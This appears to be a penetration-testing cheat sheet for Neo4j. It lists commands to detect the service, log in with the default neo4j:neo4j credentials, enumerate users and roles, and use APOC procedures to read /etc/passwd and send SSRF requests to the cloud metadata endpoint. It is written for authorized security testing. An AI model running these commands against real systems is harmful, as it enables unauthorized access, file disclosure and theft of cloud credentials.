---
service: neo4j
title: Neo4j
ports: 7474, 7473, 7687
aliases: neo4j-http, bolt
---

# Neo4j — quick wins

**When you see it:** 7474/tcp (HTTP browser) or 7687/tcp (Bolt) open → a Neo4j graph
database. Try the shipped default `neo4j:neo4j`; if APOC procedures are installed, an
authenticated user can read local files and reach out over HTTP (SSRF), and older Bolt
versions had an RMI/deserialization RCE.

> Authorized testing only. Triage is read-only. Steps marked ✏️ use APOC procedures that read
> files / make outbound requests — get sign-off before using `apoc.load.*`.

## Triage (read-only)
```sh
curl -s http://H:7474/                                  # browser UI + version JSON
curl -s http://H:7474/db/data/                          # legacy REST root (unauth?)
nc -nv -w 3 H 7687                                        # Bolt reachable
cypher-shell -a bolt://H:7687 -u neo4j -p neo4j "CALL dbms.components()"   # default creds + version
```

## Quick wins

### Default credentials → version + schema
```sh
cypher-shell -a bolt://H:7687 -u neo4j -p neo4j \
  "CALL dbms.components() YIELD name,versions,edition RETURN *"
cypher-shell -a bolt://H:7687 -u neo4j -p neo4j "CALL db.labels(); CALL db.schema.visualization()"
```
*Why:* `neo4j:neo4j` is the install default (first login normally forces a change — many
deployments never do). `dbms.components()` gives the exact version for CVE mapping; labels +
schema map the data.

### List users / roles
```sh
cypher-shell -a bolt://H:7687 -u neo4j -p neo4j "SHOW USERS"
cypher-shell -a bolt://H:7687 -u neo4j -p neo4j "CALL dbms.security.listUsers()"
```
*Why:* enumerates every database account and role — targets for reuse and privilege review.

### APOC local file read / SSRF ✏️
```sh
cypher-shell -a bolt://H:7687 -u neo4j -p neo4j \
  "CALL apoc.load.json('file:///etc/passwd') YIELD value RETURN value"
cypher-shell -a bolt://H:7687 -u neo4j -p neo4j \
  "CALL apoc.load.json('http://169.254.169.254/latest/meta-data/') YIELD value RETURN value"
```
*Why:* when the APOC plugin is installed (extremely common), `apoc.load.json/csv` reads
server-side files and issues outbound HTTP → arbitrary file read + SSRF to cloud metadata.

## aranum helpers
- `aranumtoolkit/network/enum-neo4j.sh` — dispatcher (HTTP API version, unauth `/db/data/`, Bolt reachability; default-cred check gated on `ENUM_NEO4J_DEFAULT_CRED=1`).

## Gotchas
- Neo4j 4.x+ forces a password change on first `neo4j:neo4j` login — you may authenticate but be required to reset before any query runs; note it as a valid-cred finding.
- `apoc.import.file_use_neo4j_config=true` (default) confines file access to the import dir — file read may be sandboxed; test the actual path.
- 7473 is the HTTPS browser; 7687 Bolt may be TLS-only (`bolt+s://`).
- Bolt RMI/Java deserialization CVEs affect only old 3.x lines — check `dbms.components()` before assuming.

## Sources
- HackTricks `7474-pentesting-neo4j`; Neo4j APOC procedure docs; Neo4j default-credential/hardening notes.
